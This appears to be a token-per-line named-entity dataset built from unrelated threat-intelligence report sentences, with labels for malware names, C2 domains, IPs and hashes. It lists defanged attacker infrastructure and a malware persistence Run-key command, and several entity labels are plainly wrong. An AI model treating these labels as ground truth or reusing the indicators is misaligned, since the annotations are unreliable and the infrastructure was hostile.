the	O
Jews	O
make	O
the	O
Church	O
of	O
the	O
Nativity	O
of	O
the	O
Palestinians.doc-----------.scr	O
'	O
Found	O
in	O
Israel	O

The	O
use	O
of	O
both	O
SSL/TLS	O
and	O
encoded	O
communications	O
show	O
the	O
knowledge	O
many	O
enterprises	O
perform	O
SSL	O
man-in-the-middle	O
decryption	O
of	O
traffic	O
and	O
this	O
provides	O
a	O
layer	O
to	O
hide	O
communications	O
from	O
incident	O
responders	O
.	O

Poseidon	B-malware.infosteal
has	O
maintained	O
a	O
consistently	O
evolving	O
toolkit	O
since	O
the	O
mid­2000s	O
.	O

The	O
operator	O
is	O
able	O
to	O
uninstall	O
legitimate	O
applications	O
such	O
as	O
Telegram	O
and	O
WhatsApp	O
to	O
install	O
the	O
malicious	O
versions	O
described	O
in	O
the	O
next	O
section	O
.	O

This	O
range	O
is	O
located	O
in	O
Gaza	O
and	O
belongs	O
to	O
a	O
provider	O
headquartered	O
in	O
Ramallah	O
in	O
the	O
West	O
Bank	O
:	O

Identify	O
the	O
Threat	O
Sign	O
up	O
for	O
Free	O
Facebook	O
Twitter	O
Contact	O
Us	O
•	O
Privacy	O
Policy	O
•	O
Terms	O
of	O
Service	O
©	O
2014	O
CyberSquared	O
Inc	O
.	O

The	O
malware	O
uses	O
Allatori	O
Java	O
Obfuscator	O
to	O
protect	O
the	O
code	O
and	O
make	O
it	O
harder	O
to	O
reverse	O
engineer	O
and	O
it	O
obviously	O
uses	O
communication	O
protocol	O
based	O
on	O
Java	O
JSON	O
objects	O
encapsulated	O
in	O
SSL	O
connection	O
wrapper	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

The	O
rest	O
of	O
the	O
bytes	O
are	O
variable	O
(	O
for	O
example	O
,	O
66664640	O
is	O
a	O
floating	O
point	O
version	O
number	O
of	O
ZxShell	B-malware.backdoor
)	O
.	O

Those	O
names	O
were	O
:	O
testnew1.docx	O
Test123.docx	O
test456.docx	O
test2.docx	O
book1test2.xlsx	O
Test123.doc	O
Our	O
initial	O
discovery	O
of	O
GravityRAT	B-malware.drop
was	O
through	O
a	O
malicious	O
Word	O
document	O
.	O

Indeed	O
,	O
techto-earth[.]com	B-url.cncsvr
shows	O
up	O
in	O
Google	O
with	O
an	O
entry	O
on	O
the	O
URL	O
checking	O
service	O
URLQuery[.]net	O
.	O

The	O
sample	O
also	O
contains	O
a	O
keylogger	O
functionality	O
,	O
as	O
shown	O
in	O
Figure	O
24	O
.	O

ZxShell	B-malware.backdoor
plugins	I-malware.backdoor
are	O
parsed	O
and	O
loaded	O
with	O
the	O
AnalyseAndLoadPlugins	O
function	O
.	O

Tools	O
and	O
information	O
about	O
security	O
and	O
communications	O
are	O
in	O
constant	O
circulation	O
.	O

Its	O
features	O
are	O
broadly	O
similar	O
to	O
the	O
PC	O
version	O
of	O
FinSpy	B-malware.backdoor
identified	O
in	O
Bahrain	O
,	O
but	O
it	O
also	O
contains	O
mobile-specific	O
features	O
such	O
as	O
GPS	O
tracking	O
and	O
functionality	O
for	O
silent	O
'	O
spy	O
'	O
calls	O
to	O
snoop	O
on	O
conversations	O
near	O
the	O
phone	O
.	O

The	O
first	O
modification	O
of	O
the	O
Stuxnet	B-malware.backdoor
worm	O
,	O
created	O
in	O
2009	O
,	O
used	O
only	O
one	O
driver	O
file	O
-	O
mrxcls.sys	O
without	O
a	O
digital	O
signature	O
.	O

22	O

ةي	O
غامد	O
ةطل	O
ج	O
ب	O
يمي	O
هار	O
بلاا	O
رض	O
خلاا	O
ي	O
لود	O
لا	O
ثوع	O
ب	O
م	O
لا	O
ة	O
باص	O
ا	O
.zip	O

def	O
hashStr	O
(	O
st	O
)	O
:	O
hash	O
=	O
0	O
count	O
=	O
0	O
while	O
count	O
<	O
len	O
(	O
st	O
)	O
:	O
h1	O
=	O
(	O
hash	O
<	O
<	O
0x13	O
)	O
&	O
0xFFFFFFFF	O
h2	O
=	O
(	O
hash	O
>	O
>	O
0x0d	O
)	O
&	O
0xFFFFFFFF	O
h3	O
=	O
(	O
h1	O
|	O
h2	O
)	O
&	O
0xFFFFFFFF	O
hash	O
=	O
(	O
h3	O
+	O
(	O
ord	O
(	O
st	O
[	O
count	O
]	O
)	O
^0x4a	O
)	O
)	O
&	O
0xFFFFFFFF	O
count	O
+=	O
1	O
return	O
hash	O

[	O
그림	O
10	O
]	O
Aryan의	B-malware.backdoor
특징적인	O
문자열	O
Ghostrat은	B-malware.backdoor
중국에서	O
제작된	O
백도어로	O
,	O
소스코드도	O
공개되어	O
있다	O
.	O

TeamViewer	O
client	O
registry	O
settings	O
are	O
then	O
HKLMSoftwareGoldstagerVersion5	O
and	O

Sent	O
accept	O
headers	O
are	O
:	O

The	O
symbol	O
'	O
g_bCreateListenSck	O
'	O
is	O
set	O
to	O
1	O
.	O

The	O
email	O
purported	O
to	O
have	O
been	O
sent	O
from	O
legitimate	O
email	O
ids	O
.	O

Once	O
the	O
the	O
macro	O
content	O
is	O
enabled	O
,	O
it	O
calls	O
an	O
auto	O
execute	O
function	O
Workbook_Open	O
(	O
)	O
which	O
in	O
turn	O
downloads	O
the	O
malware	O
sample	O
and	O
executes	O
on	O
the	O
system	O
.	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
The	O
is	O
an	O
increasingly	O
popular	O
Web	B-malware.ransom
shell	O
that	O
packs	O
a	O
powerful	O
punch	O
into	O
a	O
small	O
package	O
.	O

Fidelis	O
initially	O
approached	O
the	O
Shamoon	B-malware.unknown
analysis	O
strictly	O
from	O
a	O
perspective	O
of	O
determining	O
what	O
forensic	O
artifacts	O
could	O
be	O
recovered	O
from	O
a	O
targeted	O
system	O
.	O

It	O
is	O
subject	O
to	O
change	O
.	O

The	O
GET	O
request	O
has	O
the	O
format	O
:	O

The	O
popup	O
displayed	O
by	O
Java	O
is	O
displayed	O
below	O
.	O

-	O
Shusei	O
Tomonaga	O

The	O
ZIP	O
archive	O
contained	O
a	O
legitimate	O
Microsoft	O
tool	O
and	O
the	O
malicious	O
Trojan	O
.	O

If	O
the	O
SIS	O
and	O
DCS	O
controls	O
fail	O
,	O
the	O
final	O
line	O
of	O
defense	O
is	O
the	O
design	O
of	O
the	O
industrial	O
facility	O
,	O
which	O
includes	O
mechanical	O
protections	O
on	O
equipment	O
(	O
e.g.	O
rupture	O
discs	O
)	O
,	O
physical	O
alarms	O
,	O
emergency	O
response	O
procedures	O
and	O
other	O
mechanisms	O
to	O
mitigate	O
dangerous	O
situations	O
.	O

However	O
,	O
the	O
Mac	O
agent	O
brings	O
more	O
spying	O
capabilities	O
such	O
as	O
stealing	O
iOS	O
backups	O
from	O
Mac	O
computers	O
,	O
which	O
contain	O
messages	O
,	O
contacts	O
,	O
voicemail	O
,	O
call	O
history	O
,	O
notes	O
,	O
calendar	O
and	O
Safa	O
ri	O
data	O
.	O

Not	O
all	O
that	O
much	O
–	O
it	O
's	O
just	O
a	O
downloader	O
.	O

Figure	O
6	O
.	O

So	O
we	O
will	O
rename	O
this	O
function	O
as	O
Integerize_sub_44C1C0	O
(	O
)	O
,	O
and	O
head	O
back	O
to	O
the	O
main	O

107.191.62[.]45	B-ip.unknown
94.100.21[.]213	B-ip.unknown
89.38.97[.]112	B-ip.unknown
148.251.197[.]113	B-ip.unknown
83.142.230[.]113	B-ip.unknown
87.117.204[.]113	B-ip.unknown
89.38.97[.]115	B-ip.unknown
87.117.204[.]115	B-ip.unknown
185.22.172[.]40	B-ip.unknown
92.243.95[.]203	B-ip.unknown
91.218.114[.]204	B-ip.unknown
86.105.227[.]224	B-ip.unknown
91.218.114[.]225	B-ip.unknown
134.119.217[.]84	B-ip.unknown
In	O
one	O
case	O
,	O
Symantec	O
found	O
what	O
appeared	O
to	O
be	O
a	O
staging	O
server	O
used	O
by	O
the	O
attackers	O
.	O

Previous	O
reporting	O
likened	O
netsat.exe	O
as	O
a	O
headquarters	O
application	O
and	O
netui3.dll	O
as	O
a	O
field	O
unit	O
with	O
the	O
following	O
basic	O
functionality	O
:	O
Headquarters	O
(	O
netsat.exe	O
)	O
Running	O
on	O
a	O
possibly	O
compromised	O
system	O
Logging	O
some	O
activity	O
and	O
errors	O
to	O
a	O
file	O
Receiving	O
commands	O
via	O
an	O
encrypted	O
file	O
on	O
the	O
local	O
system	O
(	O
possible	O
C2	O
)	O
Listening	O
for	O
drive	O
connections	O
Infecting	O
connected	O
drives	O
with	O
netui3.dll/winmgt.dll	O
(	O
setup35.exe	O
+	O
Autorun.inf	O
)	O
Collecting	O
data	O
gathered	O
by	O
any	O
infected	O
drives	O
,	O
ostensibly	O
upon	O
their	O
return	O
from	O
being	O
connected	O
to	O
other	O
systems	O
Field	O
Unit	O
(	O
netui3.dll	O
)	O
Collecting	O
information	O
about	O
systems	O
it	O
comes	O
into	O
contact	O
with	O
through	O
connection	O
to	O
the	O
targeted	O
systems	O
with	O
the	O
drive	O
whereon	O
the	O
malware	O
resides	O
Collecting	O
file	O
listings	O
from	O
local	O
and	O
share	O
connected	O
drives	O
Discovering	O
and	O
connecting	O
to	O
shared	O
drives	O
visible	O
to	O
the	O
local	O
targeted	O
system	O
Copying	O
and	O
writing	O
files	O
to/from	O
drives	O
visible	O
to	O
the	O
local	O
targeted	O
system	O
The	O
following	O
graphic	O
serves	O
to	O
illustrate	O
a	O
possible	O
basic	O
theory	O
of	O
operation	O
given	O
available	O
data	O
:	O

However	O
,	O
the	O
code	O
does	O
not	O
decrypt	O
,	O
reference	O
,	O
or	O
use	O
the	O
following	O
registry	O
key	O
in	O
any	O
way	O
,	O
which	O
suggests	O
that	O
the	O
malware	O
author	O
left	O
this	O
artifact	O
in	O
the	O
code	O
after	O
swapping	O
to	O
the	O
run	O
key	O
listed	O
above	O
:	O
HKCU\Software\Microsoft\CTF\LangBarAddIn	O
Cmstar	B-malware.unknown
also	O
decrypts	O
a	O
752-byte	O
piece	O
of	O
shellcode	O
that	O
carries	O
out	O
communications	O
with	O
the	O
C2	O
server	O
,	O
specifically	O
by	O
sending	O
HTTP	O
POST	O
requests	O
to	O
the	O
following	O
URL	O
:	O
http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi	B-url.unknown
It	O
should	O
be	O
noted	O
that	O
the	O
C2	O
URL	O
contains	O
the	O
string	O
'	O
cgl-bin	O
'	O
,	O
which	O
visually	O
resembles	O
the	O
common	O
cgibin	O
folder	O
used	O
by	O
many	O
webservers	O
to	O
run	O
server-side	O
scripts	O
.	O

When	O
this	O
file	O
is	O
double	O
clicked	O
,	O
it	O
opens	O
a	O
Word	O
document	O
with	O
the	O
logo	O
of	O
the	O
Palestinian	O
Political	O
and	O
National	O
Guidance	O
Commission	O
.	O

HKLMSoftwareCoinstagerVersion5	O
correspondingly	O
.	O

In	O
the	O
first	O
DustySky	B-malware.drop
report	O
,	O
we	O
mentioned	O
we	O
know	O
the	O
identity	O
of	O
the	O
attacker	O
,	O
but	O
have	O
decided	O
not	O
to	O
reveal	O
it	O
.	O

22	O
Oct	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
IP	O
addresses	O
in	O
the	O
text	O
file	O
.	O

The	O
memory	O
location	O
where	O
is	O
pointing	O
looks	O
like	O
the	O
following	O
.	O

It	O
reveals	O
the	O
'	O
1a53b0cp32e46g0qio9	O
'	O
static	O
string	O
sent	O

Document	O
Status	O
:	O
FINAL	O
Last	O
Revised	O
:	O
2014-01-31	O

ZIP	O
file	O

These	O
tasks	O
usually	O
involve	O
the	O
execution	O
of	O
modules	O
or	O
executables	O
providing	O
additional	O
functionality	O
.	O

https://malwr.com/analysis/ZDg3Nzg3MDM3MWQwNDdmNTgwYWRmOTJkNWFhYTQ0ZjY/	B-url.normal

directory	O
listing	O
obtained	O
from	O
next	O
connected	O
drive	O
this	O
S/N	O
is	O
from	O
actually	O
attached	O
drive	O

Payloads	O

File	O
Name	O
:	O
Invitation.jar	B-malware.infosteal
File	O
Size	O
:	O
43866	O
bytes	O
MD5	O
:	O
859c4c667dd0f44f80b60242d93c4b0f	B-hash
SHA1	O
:	O
40859bc18ea0ffa9bcf5af699336fbdbfd6be7f1	B-hash

Furthermore	O
,	O
the	O
decrypted	O
data	O
payloads	O
will	O
only	O
reside	O
in	O
memory	O
,	O
challenging	O
traditional	O
disk	O
forensics	O
and	O
non-volatile	O
artifact	O
analysis	O
.	O

Subscribe	O

Tags	O

After	O
understanding	O
the	O
logic	O
&	O
to	O
satisfy	O
the	O
condition	O
the	O
environment	O
was	O
configured	O
to	O
give	O
proper	O
response	O
.	O

The	O
handle	O
'	O
xman_1365_x	O
'	O
(	O
self-identified	O
on	O
security	O
forums	O
as	O
Mahdi	O
Honarvar	O
)	O
was	O
found	O
by	O
FireEye	O
in	O
malware	O
artifacts	O
,	O
which	O
open	O
sources	O
linked	O
to	O
the	O
Nasr	O
Institute	O
.	O

The	O
implant	O
's	O
first	O
target	O
was	O
a	O
major	O
government-controlled	O
financial	O
organization	O
.	O

This	O
JAR	O
provides	O
technical	O
indicators	O
related	O
to	O
many	O
of	O
these	O
operations	O
,	O
recommended	O
mitigations	O
,	O
suggested	O
actions	O
to	O
take	O
in	O
response	O
to	O
the	O
indicators	O
provided	O
,	O
and	O
information	O
on	O
how	O
to	O
report	O
such	O
incidents	O
to	O
the	O
U.S.	O
Government	O
.	O

26	O
FA	O
CA	O
70	O
02	O
CB	O
70	O
44	O
–	O
Serial	O
number	O
.	O

Instead	O
,	O
the	O
Iranian	O
government	O
opted	O
for	O
speed	O
and	O
the	O
most	O
capable	O
actors	O
,	O
regardless	O
of	O
demonstrated	O
ideology	O
.	O

The	O
FireEye	O
Threat	O
Prevention	O
Platform	O
provides	O
real-time	O
,	O
dynamic	O
threat	O
protection	O
without	O
the	O
use	O
of	O
signatures	O
to	O
protect	O
an	O
organization	O
across	O
the	O
primary	O
threat	O
vectors	O
and	O
across	O
the	O
different	O
stages	O
of	O
an	O
attack	O
life	O
cycle	O
.	O

Disable	O
potentially	O
harmful	O
SQL-stored	O
procedure	O
calls	O
.	O

As	O
an	O
example	O
,	O
here	O
is	O
the	O
output	O
of	O
the	O
'	O
cronlist	O
'	O
command	O
after	O
a	O
'	O
wakeup	O
'	O
command	O
has	O
been	O
scheduled	O
to	O
run	O
on	O
7	O
April	O
2015	O
at	O
15:44	O
:	O
As	O
we	O
can	O
see	O
,	O
each	O
entry	O
is	O
identified	O
by	O
an	O
'	O
Id	O
'	O
,	O
an	O
incrementing	O
hexadecimal	O
number	O
starting	O
at	O
0xC0	O
.	O

Each	O
Svchost	O
group	O
can	O
contain	O
one	O
or	O
more	O
service	O
names	O
that	O
are	O
extracted	O
from	O
the	O
following	O
registry	O
key	O
,	O
whose	O
Parameters	O
key	O
contains	O
a	O
ServiceDLL	O
value	O
:	O

Finally	O
,	O
the	O
'	O
Visibility	O
'	O
field	O
defines	O
whether	O
the	O
command	O
execution	O
will	O
be	O
reported	O
to	O
the	O
C	O
&	O
C	O
(	O
the	O
other	O
possible	O
value	O
being	O
'	O
Silent	O
'	O
)	O
.	O

We	O
can	O
speculate	O
that	O
these	O
malicious	O
updates	O
were	O
deployed	O
in	O
a	O
stealthy	O
way	O
to	O
computer	O
networks	O
that	O
belong	O
to	O
high-value	O
targets	O
.	O

These	O
operations	O
were	O
a	O
departure	O
from	O
Gerdab	O
's	O
focus	O
on	O
maintaining	O
domestic	O
moral	O
values	O
and	O
defending	O
government	O
rhetoric	O
.	O

Decoy	O
Document	O
Author	O
:	O

targattacks	O
dll	O

4/10	O
The	O
ransomware	O
deletes	O
the	O
Volume	O
Shadow	O
Copies	O
(	O
a	O
type	O
of	O
backup	O
on	O
Windows	O
)	O
,	O
using	O
command	O
:	O

Screenshot	O
:	O

공격자는	O
행사	O
주최측으로	O
가장해	O
매크로를	O
포함한	O
엑셀이나	O
워드	O
문서를	O
첨부한	O
이메일을	O
발송했다	O
.	O

It	O
integrates	O
the	O
free	O
version	O
of	O
Armitage	O
under	O
bt5	O
and	O
kali	O
linx	O
,	O
and	O
the	O
most	O
powerful	O
functionality	O
is	O
adding	O
the	O
Payload	O
of	O
Beacon	O
.	O

22CBE2B0F1EF3F2B18B4C5AED6D7	O
BB7	O
9	O
0D032087	O
8946A7	O
37	O
49111E6C94BF1525	O
ac337	O
bd5f6f18b8fe009e45d65a2b09b	O
04dece2662f648f619d9c037	O
7	O
a7	O
ba7	O
c0	O
bbs.sonypsps[.]com	B-url.unknown
update.iaacstudio[.]com	B-url.unknown
wh0am1.itbaydns[.]com	B-url.unknown
google-updata[.]tk	B-url.unknown
windows-updata[.]tk	B-url.unknown

?	O
\Parameters\	O

In	O
the	O
oldest	O
version	O
of	O
GravityRAT	B-malware.drop
,	O
the	O
attacker	O
potentially	O
leaked	O
his	O
or	O
her	O
first	O
name	O
in	O
the	O
PDB	O
:	O
'	O
Adeel	O
'	O
—	O
the	O
path	O
contained	O
'	O
Adeel	O
's	O
Laptop	O
'	O
.	O

Appendix	B-malware.backdoor
B	O
:	O
ClamAV	O
Signatures	O

This	O
particular	O
binary	O
contained	O
the	O
following	O
debug	O
string	O
:	O
The	O
username	O
'	O
UmairAziz27	O
'	O
reveals	O
a	O
Twitter	O
account	O
@	O
umairaziz27	O
for	O
an	O
'	O
Optimistic	O
Patriot	O
by	O
choice	O
'	O
who	O
is	O
'	O
Working	O
as	O
InfoSec	O
Analyst	O
at	O
@	O
Tranchulas	O
.	O
'	O

In	O
addition	O
,	O
although	O
the	O
clear	O
fingerprints	O
of	O
the	O
perpetrators	O
leave	O
no	O
doubt	O
we	O
are	O
witnessing	O
the	O
comeback	O
of	O
the	O
same	O
APT	O
,	O
it	O
is	O
still	O
not	O
yet	O
confirmed	O
exactly	O
who	O
the	O
threat	O
group	O
behind	O
this	O
campaign	O
actually	O
is	O
.	O

These	O
highly	O
sophisticated	O
cyber	O
attacks	O
easily	O
circumvent	O
traditional	O
signature-based	O
defenses	O
,	O
such	O
as	O
next-generation	O
firewalls	O
,	O
IPS	O
,	O
anti-virus	O
,	O
and	O
gateways	O
.	O

C:\%appdata%\a.exe	O
Decrypted	O
dropper	O
.	O

If	O
a	O
path	O
is	O
found	O
,	O
the	O
dropper	O
first	O
extracts	O
the	O
Base64-encoded	O
.NET	O
executable	O
scada.exe	B-malware.unknown
to	O
the	O
current	O
directory	O
and	O
then	O
moves	O
the	O
file	O
to	O
the	O
path	O
containing	O
move-to-operational	O
or	O
move-to-operational.lnk	O
.	O

Second	O
,	O
xman_1365_x	O
created	O
an	O
Ashiyane	O
profile	O
on	O
August	O
8	O
,	O
2010	O
,	O
allegedly	O
not	O
long	O
after	O
Ashiyane	O
temporarily	O
became	O
the	O
primary	O
security	O
forum	O
in	O
Iran	O
,	O
following	O
Behrooz	O
Kamalian	O
's	O
visit	O
to	O
prominent	O
cleric	O
,	O
Ayatollah	O
Naser	O
Makarem	O
Shirazi	O
.	O

REPORT	O
CTA-2018-0116	O

The	O
promotion	O
of	O
the	O
program	O
was	O
likely	O
limited	O
to	O
social	O
media	O
,	O
and	O
the	O
distribution	O
was	O
controlled	O
from	O
the	O
author	O
's	O
main	O
page	O
,	O
'	O
Програмное	O
обеспечение	O
современного	O
боя	O
'	O
(	O
translation	O
:	O
'	O
Modern	O
combat	O
software	O
'	O
)	O
.	O

The	O
implant	O
has	O
so	O
far	O
not	O
surfaced	O
in	O
any	O
other	O
sector	O
or	O
country	O
.	O

The	O
methodology	O
we	O
proposed	O
was	O
effective	O
and	O
we	O
were	O
able	O
to	O
detect	O
many	O
interesting	O
cases	O
in	O
which	O
the	O
malware	O
authors	O
directly	O
interacted	O
with	O
the	O
sandbox	O
during	O
the	O
development	O
phase	O
of	O
the	O
threats	O
.	O

If	O
instructed	O
to	O
do	O
so	O
,	O
Bandook	B-malware.unknown
will	O
download	O
additional	O
DLL	O
files	O
which	O
provide	O
the	O
specifically	O
desired	O
functionality	O
.	O

Netsat.exe	B-malware.drop
functioned	O
as	O
a	O
master	O
application	O
affording	O
intruders	O
the	O
ability	O
,	O
in	O
a	O
selective	O
and	O
controlled	O
manner	O
,	O
to	O
infest	O
removable	O
devices	O
with	O
an	O
agent	O
application	O
in	O
the	O
form	O
of	O
netui3.dll	O
,	O
aka	O

See	O
:	O
RedOctober	B-malware.unknown
Part	O
1	O
RedOctober	B-malware.unknown
Part	O
2	O
Since	O
January	O
2013	O
,	O
we	O
've	O
been	O
on	O
the	O
lookout	O
for	O
a	O
possible	O
RedOctober	B-malware.unknown
comeback	O
.	O

/Users/	B-malware.backdoor
kazak	I-malware.backdoor
/Desktop/Project/	I-malware.backdoor
komplex	I-malware.backdoor

Either	O
backdoor	O
identifier	O
1	O
or	O
backdoor	O
identifier	O
2	O
acts	O
as	O
the	O
campaign	O
code	O
or	O
marker	O
for	O
EvilGrab	B-malware.drop
campaigns	O
,	O
which	O
is	O
recognizable	O
by	O
the	O
C	O
&	O
C	O
server	O
and/or	O
attacker	O
.	O

When	O
it	O
is	O
necessary	O
to	O
use	O
a	O
driver	O
for	O
a	O
new	O
module	O
,	O
the	O
authors	O
use	O
a	O
dedicated	O
program	O
to	O
modify	O
information	O
in	O
the	O
driver	O
's	O
'	O
reference	O
'	O
file	O
,	O
i.e.	O
its	O
name	O
and	O
service	O
information	O
as	O
well	O
as	O
the	O
registry	O
key	O
and	O
its	O
value	O
.	O

osama	O
bin	O
laden	O
password	O
pdf	O
pharmacy	O
picture	O
pinterest	O
playstation	O
poker	O
pos	O
privacy	O
pup	O
ransom	O
riskware	O
removal	O
instructions	O
rsa	O
scan	O
scareware	O
shopping	O
short	O
url	O
snowden	O
socail	O
engineering	O
soccer	O

Therefore	O
,	O
the	O
use	O
of	O
MS10-002	O
should	O
not	O
be	O
construed	O
as	O
an	O
Aurora	B-malware.infosteal
infection	O
without	O
further	O
analysis	O
of	O
the	O
dropped	O
payload	O
.	O

RegCloseKey	O
(	O
hKey	O
)	O
;	O
RegCloseKey	O
(	O
hKey	O
)	O
;	O

The	O
Python	O
malware	O
we	O
mentioned	O
first	O
in	O
this	O
article	O
constructed	O
identical	O
requests	O
:	O

The	O
evolution	O
of	O
Unrecom	B-malware.backdoor
RAT	I-malware.backdoor
dates	O
from	O
its	O
beginnings	O
as	O
a	O
tool	O
known	O
as	O
Frutas	B-malware.infosteal
RAT	I-malware.infosteal
,	O
subsequently	O
branded	O
as	O
Adwind	B-malware.backdoor
RAT	I-malware.backdoor
,	O
and	O
now	O
Unrecom	B-malware.backdoor
RAT	I-malware.backdoor
.	O

It	O
means	O
that	O
to	O
retrieve	O
the	O
value	O
associated	O
with	O
a	O
key	O
,	O
one	O
has	O
to	O
calculate	O
the	O
hash	O
of	O
the	O
key	O
to	O
locate	O
a	O
bucket	O
from	O
which	O
the	O
value	O
can	O
be	O
retrieved	O
.	O

Agent.RUI	O

These	O
possible	O
explanations	O
are	O
not	O
mutually	O
exclusive	O
.	O

,	O
Peter	O
Sahlas	O
,	O
a	O
human	O
rights	O
attorney	O
,	O
several	O
members	O
of	O
Mukhtar	O
Ablyazov	O
's	O
family	O
,	O
Astolfo	O
Di	O
Amato	O
,	O
an	O
Italian	O
attorney	O
who	O
spearheaded	O
anti-corruption	O
litigation	O
involving	O
allegations	O
of	O
corruption	O
by	O
Kazakhstan	O
,	O
and	O
dissident	O
theater	O
director	O
Bolat	O
Atabayev	O
.	O

Symantec	O
has	O
had	O
protection	O
for	O
all	O
of	O
the	O
Inception	B-malware.backdoor
Framework	I-malware.backdoor
tools	O
since	O
the	O
initial	O
emergence	O
of	O
the	O
group	O
in	O
2014	O
.	O

Babar	B-malware.drop
's	O
implant	O
is	O
a	O
32-bit	O
DLL	O
written	O
in	O
C++	O
,	O
which	O
upon	O
start	O
injects	O
itself	O
to	O
running	O
processes	O
and	O
invades	O
desktop	O
applications	O
by	O
applying	O
a	O
global	O
Windows	O
hooks	O
.	O

Even	O
though	O
the	O
identity	O
of	O
the	O
recipient	O
email	O
could	O
not	O
be	O
fully	O
verified	O
as	O
this	O
email	O
id	O
is	O
nowhere	O
available	O
on	O
the	O
internet	O
but	O
based	O
on	O
the	O
format	O
of	O
the	O
recipient	O
email	O
id	O
and	O
from	O
the	O
list	O
of	O
attendees	O
that	O
is	O
displayed	O
to	O
the	O
victim	O
in	O
the	O
decoy	O
excel	O
file	O
,	O
the	O
recipient	O
email	O
could	O
be	O
possibly	O
be	O
associated	O
with	O
either	O
the	O
Indian	O
Army	O
or	O
a	O
Government	O
entity	O
.	O

This	O
method	O
of	O
sending	O
links	O
rather	O
than	O
waiting	O
for	O
visiting	O
a	O
specific	O
compromised	O
website	O
has	O
two	O
main	O
advantages	O
:	O
The	O
advantage	O
that	O
the	O
attacker	O
does	O
n't	O
have	O
to	O
compromise	O
sites	O
that	O
are	O
relevant	O
to	O
the	O
sector	O
they	O
wish	O
to	O
perform	O
reconnaissance	O
against	O
,	O
so	O
generally	O
this	O
will	O
make	O
things	O
easier	O
for	O
the	O
attacker	O
;	O
and	O
,	O
The	O
attacker	O
has	O
to	O
deal	O
with	O
fewer	O
false	O
positives	O
in	O
terms	O
of	O
data	O
received	O
from	O
victims	O
.	O

Molerats	O
cluster	O
analysis	O
This	O
is	O
a	O
cluster	O
of	O
Molerats	O
activity	O
.	O

Guidance	O
provided	O
is	O
applicable	O
to	O
many	O
other	O
computer	O
networks	O
.	O

The	O
actor	O
took	O
their	O
time	O
to	O
ensure	O
they	O
were	O
not	O
within	O
a	O
virtual	O
environment	O
to	O
avoid	O
analysis	O
.	O

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\	O
setting	O
the	O
key	O
'	O
bookstore	O
'	O
to	O
the	O
value	O
'	O
regsvr32	O
%	O
path%\ctfmonrn.dll	O
/s	O
'	O
,	O
which	O
ensures	O
the	O
malware	O
runs	O
every	O
time	O
at	O
system	O
boot	O
.	O

The	O
blog	O
highlighted	O
that	O
the	O
backdoor	O
was	O
utilized	O
in	O
campaigns	O
from	O
March	O
2011	O
till	O
May	O
2014	O
.	O

If	O
idle	O
,	O
the	O
C	O
&	O
C	O
will	O
reply	O
with	O
'	O
,	O
and	O
the	O
malware	O
will	O
keep	O
beaconing	O
back	O
the	O
title	O
bar	O
of	O
the	O
currently	O
active	O
window	O
,	O
until	O
it	O
is	O
instructed	O
to	O
do	O
something	O
else	O
.	O

[	O
그림	O
8	O
]	O
중앙관리	O
솔루션	O
B에	O
대한	O
공격	O
도구	O
중앙관리	O
솔루션	O
C의	O
취약점을	O
이용한	O
악성코드는	O
2016년	O
9월에	O
처음	O
발견되었으며	O
,	O
파일	O
전송	O
및	O
실행	O
등을	O
수행한다	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

'	O
123	O
'	O
is	O
a	O
campaign	O
identifier	O
hard	O
coded	O
into	O
the	O
backdoor	O
.	O

Cmstar	B-malware.unknown
Yara	O
Rule	O

rouj.exe	O
%	O
TEMP%\AdobeARM.exe	O
%	O
TEMP%\iTunesHelper.exe	O
%	O
PROGRAMS%\Startup\AdobeRe.exe	O
%	O
USERPROFILE	O
%	O
\Local	O
Settings\iexplore.exe	O
%	O
USERAPPDATA%\Microsoft\wuauclt.exe	O
%	O
PROGRAMS%\Startup\adobeup.exe	O
%	O
TEMP%\AdobeUpdater.exe	O
NTLMSVC.DLL	O
%	O
PROGRAMS%\Startup\adobe_sl.lnk	O
%	O
TEMP%\runinfo.exe	O

superfish.js	O
.	O

File	O
name	O
Size	O
(	O
bytes	O
)	O

Figure	O
6	O
provides	O
a	O
summary	O
of	O
APT32	B-malware.infosteal
tools	O
and	O
techniques	O
mapped	O
to	O
each	O
stage	O
of	O
the	O
attack	O
lifecycle	O
.	O

Figure	O
21	O
:	O
Database	O
management	O
from	O
a	O
target	O
system	O
running	O
Linux	O
Figure	O
22	O
:	O
Virtual	O
terminal	O
from	O
a	O
target	O
system	O
running	O
Linux	O

[	O
그림	O
22	O
]	O
2015년	O
(	O
좌	O
)	O
과	O
2017년	O
(	O
우	O
)	O
매크로	O
코드	O
비교	O

This	O
code	O
explains	O
how	O
the	O
client	O
communicates	O
with	O
the	O
shell	O
.	O

butitistrun	O
.	O

In	O
the	O
screenshot	O
of	O
websites	O
delivering	O
malware	O
via	O
gokbayrak.com	B-url.unknown
,	O
we	O
saw	O
that	O
the	O
domain	O
name	O
macanna.com[.]tw	B-url.unknown
was	O
also	O
used	O
to	O
distribute	O
malware	O
from	O
this	O
page	O
.	O

Its	O
principal	O
duties	O
are	O
to	O
create	O
the	O
ZxShell	B-malware.backdoor
main	O
DLL	O
in	O
'	O
c:\Windows\System32\commhlp32.dll	O
'	O
and	O
to	O
install	O
the	O
Kernel	O
'	O
Load	O
Image	O
Notify	O
routine	O
'	O
.	O

Copyright	O
©	O
2018	O
FireEye	O
,	O
Inc	O
.	O

CrowdStrike	O
refers	O
to	O
activity	O
corresponding	O
to	O
FireEye	O
's	O
APT28	B-malware.infosteal
and	O
APT29	O
as	O
'	O
Fancy	O
Bear	O
'	O
and	O
'	O
Cozy	O
Bear	O
,	O
'	O
respectively	O
.	O

field	O
specifies	O
the	O
specific	O
command	O
that	O
the	O
client	O
is	O
requesting	O
the	O
server	O
variant	O
to	O
perform	O
.	O

Which	O
versions	O
of	O
Windows	O
are	O
targeted	O
?	O

Password	O
hashes	O
can	O
be	O
cracked	O
within	O
seconds	O
using	O
freely	O
available	O
tools	O
.	O

c	O
:	O
\Tools	O
>	O
findstr	O
/R	O
'	O
[	O
<	O
]	O
[	O
?	O
]	O

The	O
email	O
title	O
and	O
attached	O
file	O
name	O
were	O
written	O
in	O
Japanese	O
and	O
contain	O
general	O
business	O
,	O
political	O
,	O
and	O
economy-themed	O
phrases	O
such	O
as	O
(	O
World	O
economy	O
)	O
(	O
economic	O
policy	O
)	O
